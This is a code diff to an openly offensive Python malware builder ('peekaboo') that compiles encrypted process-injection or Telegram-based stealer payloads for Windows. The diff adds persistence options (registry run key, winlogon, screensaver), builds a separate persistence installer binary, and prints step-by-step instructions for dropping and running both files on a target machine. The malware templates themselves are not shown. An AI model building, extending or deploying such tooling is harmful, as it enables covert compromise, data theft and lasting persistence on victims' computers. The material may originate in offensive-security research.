@@ -1,4 +1,4 @@
-# peekaboo_refactored.py
+# peekaboo.py
 from __future__ import annotations
 import argparse
 import subprocess
@@ -18,6 +18,7 @@ PRAGMA_ONCE_RE = re.compile(r'^\s*#\s*pragma\s+once\s*$', re.M)
 IFDEF_GUARD_RE = re.compile(r'^\s*#\s*ifndef\s+([A-Za-z_]\w*)\s*\n\s*#\s*define\s+\1\s*', re.M)
 ENDIF_RE = re.compile(r'^\s*#\s*endif\b.*$', re.M | re.M)
 PAYLOAD_PLACEHOLDER = "PAYLOAD_PLACEHOLDER"
+PERSISTENCE_TYPES = ["none", "registry_run", "winlogon", "screensaver"]
 
 
 class Colors:
@@ -70,7 +71,7 @@ class Peekaboo:
 [=^..^=] by @cocomelonc - https://cocomelonc.github.io
 """
 
-    def __init__(self, malware_type: str, payload_name: str, encryption_algo: str, injection_type: str, stealer_api: str):
+    def __init__(self, malware_type: str, payload_name: str, encryption_algo: str, injection_type: str, stealer_api: str, persistence_type: str = "none"):
         try:
             print(Colors.highlight(self.banner))
             print(Colors.header("init peekaboo builder with params"))
@@ -79,8 +80,8 @@ class Peekaboo:
             print(Colors.info(f"encryption: {encryption_algo}"))
             print(Colors.info(f"injection: {injection_type}"))
             print(Colors.info(f"stealer: {stealer_api}"))
+            print(Colors.info(f"persistence: {persistence_type}"))
         except Exception:
-            # printing shouldn't crash init
             pass
 
         self.malware_type = malware_type
@@ -88,6 +89,7 @@ class Peekaboo:
         self.encryption_algo = encryption_algo
         self.injection_type = injection_type
         self.stealer_api = stealer_api
+        self.persistence_type = persistence_type
 
         # compiler discovery
         self.mingw_path = self._find_mingw()
@@ -600,6 +602,7 @@ class Peekaboo:
             decrypt_file = self.templates_dir / "crypto" / self.encryption_algo / "decrypt.c"
             main_file = hack_encrypted
             combined = self.builder_merge(decrypt_file, main_file)
+
             outp = self.templates_dir / "injection" / self.injection_type / "hack_final.c"
             outp.parent.mkdir(parents=True, exist_ok=True)
             outp.write_text(combined, encoding="utf-8")
@@ -613,6 +616,54 @@ class Peekaboo:
         except Exception as e:
             print(Colors.error(f"error building/compiling malware: {e}"))
 
+    def build_persistence_binary(self, malware_out_dir: Path) -> Optional[Path]:
+        try:
+            print(Colors.header(f"building persistence binary: {self.persistence_type}"))
+            pers_src = self.get_persistence_template(self.persistence_type)
+            if not pers_src:
+                print(Colors.error(f"persistence template not found: {self.persistence_type}"))
+                return None
+
+            pers_c = self.templates_dir / "persistence" / f"{self.persistence_type}_build.c"
+            pers_c.write_text(pers_src, encoding="utf-8")
+
+            pers_out = malware_out_dir / "persistence.exe"
+            result = self.compile_c(pers_c, pers_out)
+            try:
+                if pers_c.exists():
+                    pers_c.unlink()
+            except Exception:
+                pass
+            return result
+        except Exception as e:
+            print(Colors.error(f"error building persistence binary: {e}"))
+            return None
+
+    def _print_instructions(self, malware_exe: Path, persistence_exe: Optional[Path]) -> None:
+        try:
+            sep = Colors.highlight("=" * 58)
+            print(sep)
+            print(Colors.header("build complete - generated files"))
+            print(Colors.success(f"malware:     {malware_exe}"))
+            if persistence_exe and persistence_exe.exists():
+                print(Colors.success(f"persistence: {persistence_exe}"))
+            print(sep)
+            if persistence_exe and persistence_exe.exists():
+                print(Colors.header("deployment instructions"))
+                print(Colors.info("1. drop both files to the target machine:"))
+                print(Colors.info(f"     peekaboo.exe    - malware payload"))
+                print(Colors.info(f"     persistence.exe - persistence installer ({self.persistence_type})"))
+                print(Colors.info("2. run persistence installer (optionally pass target path):"))
+                print(Colors.info(f"     persistence.exe"))
+                print(Colors.info(f"     persistence.exe C:\\Users\\Public\\peekaboo.exe"))
+                print(Colors.info("3. if no path given, installer looks for peekaboo.exe"))
+                print(Colors.info("   in the same directory as persistence.exe"))
+                if self.persistence_type == "winlogon":
+                    print(Colors.warning("note: winlogon requires SYSTEM/admin privileges"))
+            print(sep)
+        except Exception:
+            pass
+
     def run(self) -> None:
         try:
             deps_ok = self.check_dependencies()
@@ -621,6 +672,15 @@ class Peekaboo:
                 print(Colors.error("encryption step failed; aborting"))
                 return
             self.build_and_compile_malware(encrypted_payload)
+
+            malware_exe = self.templates_dir / "injection" / self.injection_type / "peekaboo.exe"
+            persistence_exe = None
+
+            if self.persistence_type != "none":
+                malware_out_dir = self.templates_dir / "injection" / self.injection_type
+                persistence_exe = self.build_persistence_binary(malware_out_dir)
+
+            self._print_instructions(malware_exe, persistence_exe)
         except Exception as e:
             print(Colors.error(f"fatal error in run(): {e}"))
 
@@ -632,10 +692,12 @@ if __name__ == "__main__":
     parser.add_argument("-m", '--malware', required=False, help="injection or stealer", default="injection")
     parser.add_argument("-i", '--injection', required=False, help="injection type (for injection)", default="virtualallocex")
     parser.add_argument("-s", '--stealer', required=False, help="stealer API (for stealer)", default="telegram")
+    parser.add_argument("-r", '--persistence', required=False, help="persistence technique",
+                        default="none", choices=PERSISTENCE_TYPES)
     args = vars(parser.parse_args())
 
     try:
-        peekaboo = Peekaboo(args['malware'], args['payload'], args['encryption'], args['injection'], args['stealer'])
+        peekaboo = Peekaboo(args['malware'], args['payload'], args['encryption'], args['injection'], args['stealer'], args['persistence'])
         peekaboo.run()
     except Exception as e:
         print(Colors.error(f"unhandled exception in __main__: {e}"))
